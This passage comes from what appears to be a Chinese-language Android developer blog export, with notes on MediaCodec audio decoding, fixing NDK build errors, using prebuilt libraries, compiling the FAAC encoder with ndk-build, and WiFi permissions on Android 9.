<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mime MediaFormat.MIMETYPE_AUDIO_*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">createMediaCodecDecoder</span><span class="params">(mime: <span class="type">String</span>, sampleRate:<span class="type">Int</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> format = MediaFormat.createAudioFormat(mime,sampleRate,<span class="number">1</span>)</span><br><span class="line">    format.setInteger(MediaFormat.KEY_CHANNEL_MASK, AudioFormat.CHANNEL_IN_MONO);</span><br><span class="line">    format.setInteger(MediaFormat.KEY_BIT_RATE, <span class="number">128000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> mMediaCodec = MediaCodec.createDecoderByType(mime)</span><br><span class="line">    mMediaCodec.configure(format, <span class="literal">null</span>, <span class="literal">null</span>, MediaCodec.CONFIGURE_FLAG_ENCODE)</span><br><span class="line"></span><br><span class="line">    mMediaCodec.setCallback(<span class="keyword">object</span> :MediaCodec.Callback()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输入缓冲区可用时回调此函数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onInputBufferAvailable</span><span class="params">(codec: <span class="type">MediaCodec</span>, index: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">        	<span class="comment">//TODO 这里输入数据</span></span><br><span class="line">            <span class="keyword">val</span> dataLength = <span class="number">2</span></span><br><span class="line">            <span class="keyword">val</span> <span class="keyword">data</span> = ByteArray(dataLength)<span class="comment">//TODO 假设这是一帧ACC格式数据，作为输入解码器的数据</span></span><br><span class="line">            <span class="keyword">val</span> inputBuffer = codec.getInputBuffer(index)</span><br><span class="line">            <span class="keyword">if</span>(inputBuffer != <span class="literal">null</span>)&#123;</span><br><span class="line">                inputBuffer.clear()</span><br><span class="line">                inputBuffer.put(<span class="keyword">data</span>)</span><br><span class="line">                codec.queueInputBuffer(index,<span class="number">0</span>,dataLength,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                codec.queueInputBuffer(index,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输出编码数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onOutputBufferAvailable</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            codec: <span class="type">MediaCodec</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            index: <span class="type">Int</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            info: <span class="type">MediaCodec</span>.<span class="type">BufferInfo</span> )</span></span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(info.size &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != <span class="number">0</span>) &#123;</span><br><span class="line">                        println(<span class="string">"解码器输出配置信息"</span>)</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        println(<span class="string">"解码器输出编码数据"</span>)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">val</span> outputBuffer = codec.getOutputBuffer(index)<span class="comment">//取出数据</span></span><br><span class="line">                    <span class="keyword">val</span> outputData = ByteArray(info.size)</span><br><span class="line">                    outputBuffer?.<span class="keyword">get</span>(outputData)</span><br><span class="line">                    <span class="comment">//TODO outputData 是解码后PCM数据，可以用AudioTrack播放</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (e:Exception)&#123;</span><br><span class="line">                e.printStackTrace()</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                codec.releaseOutputBuffer(index, <span class="literal">false</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onError</span><span class="params">(codec: <span class="type">MediaCodec</span>, e: <span class="type">MediaCodec</span>.<span class="type">CodecException</span>)</span></span> &#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onOutputFormatChanged</span><span class="params">(codec: <span class="type">MediaCodec</span>, format: <span class="type">MediaFormat</span>)</span></span> &#123;</span><br><span class="line">            println(<span class="string">"onOutputFormatChanged"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    mMediaCodec.start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h2><p>参考官网<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MediaCodec codec = MediaCodec.createByCodecName(name);</span><br><span class="line"> codec.configure(format, …);</span><br><span class="line"> MediaFormat outputFormat = codec.getOutputFormat(); <span class="comment">// option B</span></span><br><span class="line"> codec.start();</span><br><span class="line"> <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="keyword">int</span> inputBufferId = codec.dequeueInputBuffer(timeoutUs);</span><br><span class="line">  <span class="keyword">if</span> (inputBufferId &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    ByteBuffer inputBuffer = codec.getInputBuffer(…);</span><br><span class="line">    <span class="comment">// fill inputBuffer with valid data</span></span><br><span class="line">    …</span><br><span class="line">    codec.queueInputBuffer(inputBufferId, …);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> outputBufferId = codec.dequeueOutputBuffer(…);</span><br><span class="line">  <span class="keyword">if</span> (outputBufferId &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId);</span><br><span class="line">    MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); <span class="comment">// option A</span></span><br><span class="line">    <span class="comment">// bufferFormat is identical to outputFormat</span></span><br><span class="line">    <span class="comment">// outputBuffer is ready to be processed or rendered.</span></span><br><span class="line">    …</span><br><span class="line">    codec.releaseOutputBuffer(outputBufferId, …);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (outputBufferId == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) &#123;</span><br><span class="line">    <span class="comment">// Subsequent data will conform to new format.</span></span><br><span class="line">    <span class="comment">// Can ignore if using getOutputFormat(outputBufferId)</span></span><br><span class="line">    outputFormat = codec.getOutputFormat(); <span class="comment">// option B</span></span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> codec.stop();</span><br><span class="line"> codec.release();</span><br></pre></td></tr></table></figure></p>
<p>实现一个同步音频解码器（伪代码）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MediaCodec codec = MediaCodec.createDecoderByType(MediaFormat.MIMETYPE_AUDIO_G711_ALAW);</span><br><span class="line"><span class="keyword">final</span> MediaFormat format = MediaFormat.createAudioFormat(</span><br><span class="line">        MediaFormat.MIMETYPE_AUDIO_G711_ALAW,</span><br><span class="line">        <span class="number">8000</span>,</span><br><span class="line">        <span class="number">1</span>);</span><br><span class="line">format.setInteger(MediaFormat.KEY_BIT_RATE, <span class="number">128000</span>);</span><br><span class="line">codec.configure(format,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="number">0</span>);</span><br><span class="line">codec.start();</span><br><span class="line">inputBuffers = codec.getInputBuffers();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> inputIndex = codec.dequeueInputBuffer(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(inputIndex &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        ByteBuffer inputBuffer = inputBuffers[inputIndex];</span><br><span class="line">        inputBuffer.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//假如这是输入需要解码的G711A格式数据，</span></span><br><span class="line">        <span class="keyword">int</span> aacLength = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] g711Buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[aacLength];</span><br><span class="line"></span><br><span class="line">        inputBuffer.put(g711Buffer, <span class="number">0</span>, aacLength);</span><br><span class="line">        codec.queueInputBuffer(inputIndex, <span class="number">0</span>, aacLength, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        MediaCodec.BufferInfo infoOutput = <span class="keyword">new</span> MediaCodec.BufferInfo();</span><br><span class="line">        <span class="keyword">int</span> outputIndex = codec.dequeueOutputBuffer(infoOutput,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (outputIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ByteBuffer outputBuffer = codec.getOutputBuffer(outputIndex);</span><br><span class="line">            <span class="keyword">byte</span>[] outputData = <span class="keyword">new</span> <span class="keyword">byte</span>[infoOutput.size];</span><br><span class="line">            outputBuffer.get(outputData);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TODO 这是输出的PCM数据</span></span><br><span class="line"></span><br><span class="line">            codec.releaseOutputBuffer(outputIndex, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同步编码器类似，省略。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>MediaCodec,硬编解码器</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Ndk常见报错</title>
    <url>/Android/Android%20Ndk%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h2 id="1-运行时找不到so文件"><a href="#1-运行时找不到so文件" class="headerlink" title="1. 运行时找不到so文件"></a>1. 运行时找不到so文件</h2><p>具体表现为：已经在libs目录添加了所有平台的so文件，但是运行是依然提示找不到so文件。</p>
<p>如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.UnsatisfiedLinkError: dalvik.system.PathClassLoader[DexPathList[[zip file &quot;/data/app/com.example.ijkplayer-CyD2mFQ8g6fyehi-g_1ALQ==/base.apk&quot;],nativeLibraryDirectories=[/data/app/com.example.ijkplayer-CyD2mFQ8g6fyehi-g_1ALQ==/lib/arm64, /system/lib64, /vendor/lib64]]] couldn&apos;t find &quot;libijkffmpeg.so&quot;</span><br><span class="line">        at java.lang.Runtime.loadLibrary0(Runtime.java:1012)</span><br></pre></td></tr></table></figure></p>
<p>问题：<br>编译时，jniLibs默认的路径是 <code>/app/src/main/jniLibs</code> ,如果so文件放在 <code>/app/libs</code> 需指定目录。</p>
<p>解决：</p>
<ol>
<li><p>so文件放置在  <code>/app/src/main/jniLibs</code> (推荐)</p>
</li>
<li><p>指定工程的so文件路径<br>build.gradle</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">	...</span><br><span class="line">    sourceSets &#123;</span><br><span class="line">        main &#123;</span><br><span class="line">            jniLibs.srcDirs = [&apos;libs&apos;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="2-AS提示ndk版本不匹配"><a href="#2-AS提示ndk版本不匹配" class="headerlink" title="2. AS提示ndk版本不匹配"></a>2. AS提示ndk版本不匹配</h2><p>编译是出现错误：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No version of NDK matched the requested version 21.0.6113669. Versions available locally: 21.3.6528147</span><br></pre></td></tr></table></figure></p>
<p>本地是：21.3.6528147版本，需要匹配21.0.6113669版本。</p>
<p>问题：AS没有配置NDK路径</p>
<p>解决：给工程配置NDK-21.3.6528147版本的路径</p>
<ol>
<li><p>配置本地NDK（已经弃用）<br>local.properties</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ndk.dir=D\:\\android_sdk_4\\ndk\\21.3.6528147</span><br><span class="line">sdk.dir=D\:\\android_sdk_4</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定NDK版本为本地的版本（推荐）</p>
</li>
</ol>
<p>build.gradle<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">	ndkVersion &apos;21.3.6528147&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-不识别-‘uint32-t’"><a href="#3-不识别-‘uint32-t’" class="headerlink" title="3. 不识别 ‘uint32_t’"></a>3. 不识别 ‘uint32_t’</h2><p>IDE提示红色错误：Unknown type name ‘uint32_t’，这个错误是由于我把CPP的代码放进一个<code>Library Module</code>（手动创建CMakeLists.txt等编译环境），而<code>Library Module</code>没有include 到Ndk C++库：<code>“\toolchains\llvm\prebuild\windows-x86_64”</code> .<br>更正的方法就是将CPP代码放在 <code>Phone Module</code> 中编译，创建项目选择 <code>Phone Module</code> 时，选择 <code>Native C++</code> 会自动include Ndk C++库。</p>
<blockquote>
<p>用 Android Studio 创建Library Module ，是不能创建一个C++的Module的。</p>
</blockquote>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Ndk使用预构建库</title>
    <url>/Android/Android%20Ndk%E4%BD%BF%E7%94%A8%E9%A2%84%E6%9E%84%E5%BB%BA%E5%BA%93/</url>
    <content><![CDATA[<p>fork <a href="https://developer.android.google.cn/ndk/guides/prebuilts?hl=zh_cn" target="_blank" rel="noopener">【官网指导页面】</a></p>
<p> <a href="https://developer.android.google.cn/ndk/guides/android_mk?hl=zh_cn" target="_blank" rel="noopener">【Android.mk语法】</a><br> <a href="https://developer.android.google.cn/ndk/guides/application_mk?hl=zh_cn" target="_blank" rel="noopener">【Application.mk语法】</a></p>
<p>NDK 支持使用预构建库（同时支持静态库和共享库）。此功能有以下两个主要用例：</p>
<pre><code>* 向第三方 NDK 开发者分发您自己的库，而不分发您的源代码。
* 使用您自己的库的预构建版本来提升构建速度。
</code></pre><p>声明预构建库</p>
<p>您必须将自己使用的每个预构建库声明为一个独立模块。为此，请执行以下步骤：</p>
<pre><code>1. 为模块提供名称。此名称不需要与预构建库本身的名称相同。
2. 在模块的 Android.mk 文件中，将指向您提供的预构建库的路径分配到 LOCAL_SRC_FILES。指定 LOCAL_PATH 变量的值的相对路径。
&gt; 注意：您必须确保选择与您的目标 ABI 对应的预构建库版本。如需了解有关确保库支持 ABI 的详细信息，请参阅为预构建库选择 ABI。
3. 根据您使用的是共享库 (.so) 还是静态库 (.a)，添加 PREBUILT_SHARED_LIBRARY 或 PREBUILT_STATIC_LIBRARY。
</code></pre><p>下面这个简单的示例假设预构建库 libfoo.so 与描述它的 Android.mk 文件位于同一个目录中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := foo-prebuilt</span><br><span class="line">LOCAL_SRC_FILES := libfoo.so</span><br><span class="line">include $(PREBUILT_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
<p>在此示例中，模块名称与预构建库的名称相同。</p>
<p>构建系统会将您的预构建共享库副本放入 $PROJECT/obj/local 中，而将另一个提取的调试信息的副本放入 $PROJECT/libs/<abi> 中。此处，$PROJECT 是项目的根目录。<br>从其他模块引用预构建库</abi></p>
<p>如需从其他模块引用预构建库，请在与这些模块关联的 Android.mk 文件中，将该预构建库的名称指定为 LOCAL_STATIC_LIBRARIES 或 LOCAL_SHARED_LIBRARIES 变量的值。</p>
<p>例如，使用 libfoo.so 的模块的说明可能类似于以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := foo-user</span><br><span class="line">LOCAL_SRC_FILES := foo-user.c</span><br><span class="line">LOCAL_SHARED_LIBRARIES := foo-prebuilt</span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
<p>此处，LOCAL_MODULE 是引用预构建库的模块的名称；LOCAL_SHARED_LIBRARIES 是预构建库本身的名称。<br>导出预构建库的头文件</p>
<p>foo-user.c 中的代码取决于通常位于随预构建库分发的头文件（如 foo.h）中的特定声明。例如，foo-user.c 中可能会有类似于以下内容的一行代码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;foo.h&gt;</span><br></pre></td></tr></table></figure></p>
<p>在这种情况下，如果您构建 foo-user 模块，需要提供头文件及其指向编译器的 include 路径。完成此任务的一个简单方法是在预构建模块定义中使用导出变量。例如，只要头文件 foo.h 位于与预构建模块关联的 include 目录下，您就可以按以下方式对其进行声明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := foo-prebuilt</span><br><span class="line">LOCAL_SRC_FILES := libfoo.so</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/include</span><br><span class="line">include $(PREBUILT_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
<p>此处的 LOCAL_EXPORT_C_INCLUDES 定义会确保构建系统导出指向预构建库的 include 目录的路径，针对依赖于预构建库的模块将该路径附加到 LOCAL_C_INCLUDES 的值开头。</p>
<p>此操作可让编译系统查找必需的标头。<br>调试预构建库</p>
<p>建议您提供包含调试符号的预构建共享库。NDK 构建系统总是会从其安装到 $PROJECT/libs/<abi>/ 的那个版本的库中删除这些符号，但您可以使用调试版本通过 ndk-gdb 进行调试。<br>为预构建库选择 ABI</abi></p>
<p>请务必为您的目标 ABI 选择正确版本的预构建共享库。Android.mk 文件中的 TARGET_ARCH_ABI 变量可以将构建系统指向适当版本的库。</p>
<p>例如，假设您的项目包含库 libfoo.so 的以下两个版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">armeabi/libfoo.so</span><br><span class="line">x86/libfoo.so</span><br></pre></td></tr></table></figure>
<p>以下代码段显示了如何使用 TARGET_ARCH_ABI，以便构建系统选择适当版本的库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := foo-prebuilt</span><br><span class="line">LOCAL_SRC_FILES := $(TARGET_ARCH_ABI)/libfoo.so</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/include</span><br><span class="line">include $(PREBUILT_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
<p>如果您已将 armeabi 指定为 TARGET_ARCH_ABI 的值，构建系统便会使用 armeabi 目录中的 libfoo.so 版本。如果您已将 x86 指定为 TARGET_ARCH_ABI 的值，构建系统便会使用 x86 目录中的版本。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Ndk编译开源库（FAAC）</title>
    <url>/Android/Android%20Ndk%E7%BC%96%E8%AF%91FAAC%E5%BA%93/</url>
    <content><![CDATA[<p>想在Android下实现PCM编码为AAC，已经用Android硬编码实现过AAC编码，但想了解一下FAAC这个库，比较一下两者的差异。</p>
<p>FAAC是开源的C语言库，查了一下网络上的文章，在Linux上编译FAAC，大多数都是编写一个脚本<code>build_android.sh</code> ，脚本里是用make编译，最终只有一个平台的共享库so或者静态库a文件。如：<a href="https://blog.csdn.net/qq_30379689/article/details/78145796" target="_blank" rel="noopener">【AAC在Linux下编译】</a></p>
<p>而Android上使用共享库一般会有如下几个平台：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── arm64-v8a</span><br><span class="line">│   └── libxx.so</span><br><span class="line">├── armeabi</span><br><span class="line">│   └── libxx.so</span><br><span class="line">├── armeabi-v7a</span><br><span class="line">│   └── libxx.so</span><br><span class="line">├── x86</span><br><span class="line">│   └── libxx.so</span><br><span class="line">└── x86_64</span><br><span class="line">    └── libxx.so</span><br></pre></td></tr></table></figure></p>
<p>所以借着FAAC，记录一下Android如何通过NDK使用开源C/C++库。</p>
<p>现在NDK有两种方式编译C/C++库： </p>
<ul>
<li>ndk-build </li>
<li>cmake</li>
</ul>
<p>根据我的理解，两者的不同之处在于：</p>
<ol>
<li><code>ndk-build</code>构建的库，编译好的 <code>so</code> 文件，加上 <code>include</code> 目录下的头文件，就可以使用了，不需要再面对开源库繁琐的源码了。但要在Android项目中使用，你还得创建一个NDK项目，通过JNI调用，所以最后你的项目会有两个 <code>so</code> 库文件（开源库 + JNI库）。</li>
<li><code>cmake</code> 构建，现在创建一个NDK项目，默认就是用cmake，直接把C/C++库的源文件放到cpp目录下，记录到<code>CMakeLists.txt</code> ，直接通过JNI调用库include的接口就行，最后项目就只有一个 <code>so</code> 库文件 （这种方式必须有JNI，否则编译不过）。</li>
</ol>
<p>那么如何选择？</p>
<p>我觉得两种都可以，不必纠结，但一般源文件多的C/C++库建议用 <code>ndk-build</code> ，不用频繁的编译C/C++代码，拖慢编译速度，但如果你没有ndk-build的环境（第一次构建），配置这个环境也是相当的麻烦。而小项目，如FAAC，则用cmake构建会比较方便，一次就可以把FAAC编译好，并且可以通过JNI将FAAC接口转为Java的。</p>
<h1 id="A-ndk-build编译预构建库"><a href="#A-ndk-build编译预构建库" class="headerlink" title="A. ndk-build编译预构建库"></a>A. ndk-build编译预构建库</h1><p>由于之前学NDK有保留一个Demo <code>LearnAndroidAndLibrary\NdkTestLibrarySo</code> 项目，所以直接借鉴Demo的配置文件：<code>Android.mk</code> 、 <code>Application.mk</code> ，本次直接拷贝过来做一些小的修改。</p>
<h3 id="一-ndk-build编译faac"><a href="#一-ndk-build编译faac" class="headerlink" title="一. ndk-build编译faac"></a>一. ndk-build编译faac</h3><p>我这边运行的环境是：Ubuntu, G++, Java8（加入环境变量）,Android SDK（加入环境变量） , NDK19 （加入环境变量）。</p>
<ol>
<li><p>下载源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget http://downloads.sourceforge.net/faac/faac-1.28.tar.gz</span><br><span class="line">$ tar -zxvf faac-1.28.tar.gz</span><br><span class="line">$ cd faac-1.28</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置项目环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir jni</span><br><span class="line">$ cp include jni/</span><br><span class="line">$ cp libfaac jni/   # 猜的，应该只需要libfaac这些源码</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd jni</span><br><span class="line">$ find -name *.c</span><br><span class="line">./libfaac/kiss_fft/kiss_fftr.c</span><br><span class="line">./libfaac/kiss_fft/kiss_fft.c</span><br><span class="line">./libfaac/ltp.c</span><br><span class="line">./libfaac/util.c</span><br><span class="line">./libfaac/aacquant.c</span><br><span class="line">./libfaac/psychkni.c</span><br><span class="line">./libfaac/bitstream.c</span><br><span class="line">./libfaac/tns.c</span><br><span class="line">./libfaac/backpred.c</span><br><span class="line">./libfaac/midside.c</span><br><span class="line">./libfaac/fft.c</span><br><span class="line">./libfaac/frame.c</span><br><span class="line">./libfaac/huffman.c</span><br><span class="line">./libfaac/channels.c</span><br><span class="line">./libfaac/filtbank.c</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><code>Android.mk</code> 内容是拷贝其他开源库的，这里只修改两个内容</p>
<ol>
<li>源码 .c 文件列表</li>
<li>lib名称<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim Android.mk</span><br><span class="line">LOCAL_PATH:=$(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"><span class="comment"># 1. 贴进来所有的c文件</span></span><br><span class="line">LOCAL_SRC_FILES:= \</span><br><span class="line">    libfaac/kiss_fft/kiss_fftr.c \</span><br><span class="line">    libfaac/kiss_fft/kiss_fft.c \</span><br><span class="line">    libfaac/ltp.c \</span><br><span class="line">    libfaac/util.c \</span><br><span class="line">    libfaac/aacquant.c \</span><br><span class="line">    libfaac/psychkni.c \</span><br><span class="line">    libfaac/bitstream.c \</span><br><span class="line">    libfaac/tns.c \</span><br><span class="line">    libfaac/backpred.c \</span><br><span class="line">    libfaac/midside.c \</span><br><span class="line">    libfaac/fft.c \</span><br><span class="line">    libfaac/frame.c \</span><br><span class="line">    libfaac/huffman.c \</span><br><span class="line">    libfaac/channels.c \</span><br><span class="line">    libfaac/filtbank.c \</span><br><span class="line"></span><br><span class="line">LOCAL_C_INCLUDES := $(LOCAL_PATH)/include</span><br><span class="line"></span><br><span class="line">LOCAL_LDLIBS := -llog</span><br><span class="line"></span><br><span class="line"><span class="comment">#LOCAL_SHARED_LIBRARIES := \</span></span><br><span class="line"><span class="comment">#    libcutils</span></span><br><span class="line"></span><br><span class="line">LOCAL_MODULE:= libfaac <span class="comment"># 2. 修改库的名称</span></span><br><span class="line">LOCAL_CPPFLAGS := -O2 -fexceptions -DHAVE_SOCKLEN_T -DHAVE_STRUCT_IOVEC -Wno-write-strings</span><br><span class="line">LOCAL_MODULE_TAGS := optional</span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><code>Application.mk</code> 不需要修改<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim Application.mk</span><br><span class="line">APP_ABI := all  <span class="comment"># 所有abi平台，这里可以指定abi平台，多个用逗号隔开</span></span><br><span class="line">APP_PLATFORM := android-30</span><br><span class="line"><span class="comment"># APP_STL := stlport_shared # 旧版ndk，如：`ndk;16.1.4479499` 用这个字段，新版不再支持</span></span><br><span class="line">APP_STL := c++_shared       <span class="comment"># 新版ndk，c++_static or c++_shared</span></span><br><span class="line">APP_CPPFLAGS += -fno-rtti</span><br><span class="line">APP_ALLOW_MISSING_DEPS=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>APP_STL stlport_static is no longer supported. Please switch to either c++_static or c++_shared.</p>
</blockquote>
<h3 id="二-编译"><a href="#二-编译" class="headerlink" title="二. 编译"></a>二. 编译</h3><p>在 <code>faac-1.28/jni</code> 目录下执行<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ndk-build</span><br></pre></td></tr></table></figure></p>
<p>编译成功<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ tree ../libs/</span><br><span class="line">../libs/</span><br><span class="line">├── arm64-v8a</span><br><span class="line">│   └── libfaac.so</span><br><span class="line">├── armeabi-v7a</span><br><span class="line">│   └── libfaac.so</span><br><span class="line">├── x86</span><br><span class="line">│   └── libfaac.so</span><br><span class="line">└── x86_64</span><br><span class="line">    └── libfaac.so</span><br><span class="line"></span><br><span class="line">7 directories, 7 files</span><br></pre></td></tr></table></figure></p>
<h3 id="三-使用预构建库"><a href="#三-使用预构建库" class="headerlink" title="三. 使用预构建库"></a>三. 使用预构建库</h3><ol>
<li>include/faaccfg.h  faac.h</li>
<li>libfaac.so</li>
</ol>
<p>参考: <a href="../Android Ndk使用预构建库">【Android Ndk使用预构建库】</a></p>
<blockquote>
<p>TODO: 刚编译完，还没有时间在Android上测试这个库是否能跑。</p>
</blockquote>
<h1 id="B-cmake-编译-faac"><a href="#B-cmake-编译-faac" class="headerlink" title="B. cmake 编译 faac"></a>B. cmake 编译 faac</h1><p>这个就比较简单，用 Android Studio 创建一个NDK的Android项目，将libfaac源码放进去，include放进去，剩下的就是和使用预构建库一样了：通过默认的JNI接口 native-lib.cpp调用 include的接口，在通过Java层调用 native-lib.cc就可以使用fAAC了，有空在记录一下这个过程。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>Android P(9.0) WiFi信息获取变更</title>
    <url>/Android/Android%20P(9.0)%20WiFi%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E5%8F%98%E6%9B%B4/</url>
    <content><![CDATA[<p>在开发IoT App往往需要WiFi配网功能，所以需要用到获取当前SSID的API接口，在Android9.0上获取的权限更加严格。</p>
<p><img src="/images/android/android9-wifi.png" alt="android9-wifi.png"></p>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ul>
<li><p>ACCESS_FINE_LOCATION <strong>或</strong> ACCESS_COARSE_LOCATION (需要动态申请)</p>
</li>
<li><p>ACCESS_WIFI_STATE 和 ACCESS_NETWORK_STATE</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;</span><br></pre></td></tr></table></figure>
